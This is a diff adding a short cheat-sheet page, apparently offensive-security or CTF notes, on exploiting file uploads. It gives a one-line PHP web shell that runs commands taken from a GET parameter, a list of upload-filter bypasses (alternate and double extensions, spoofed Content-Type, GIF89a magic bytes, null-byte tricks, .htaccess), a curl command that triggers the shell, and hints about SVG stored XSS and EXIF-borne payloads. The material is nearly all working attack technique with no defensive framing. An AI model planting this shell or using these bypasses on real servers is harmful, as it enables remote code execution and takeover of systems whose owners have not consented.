@@ -1,0 +1,29 @@
+---
+title: "File Upload"
+---
+
+If you can upload a server-executable file into a reachable path, you get RCE. Match the payload to the server language.
+
+```php
+// shell.php
+<?php system($_GET['c']); ?>
+```
+
+## Bypassing filters
+
+```text
+Extension : shell.php, .phtml, .php5, .php.jpg, shell.pHp
+Content-Type : set image/png while keeping .php
+Magic bytes : prepend GIF89a; to pass image checks
+Double ext / null : shell.php%00.png, shell.php;.png
+.htaccess : upload one making a custom ext run as PHP
+```
+
+```bash
+# find where it landed, then trigger
+curl "http://$IP/uploads/shell.php?c=id"
+```
+
+<Tip>
+For image uploads that get processed, an SVG with embedded script (stored XSS) or an EXIF-borne PHP payload can work when raw uploads are blocked.
+</Tip>
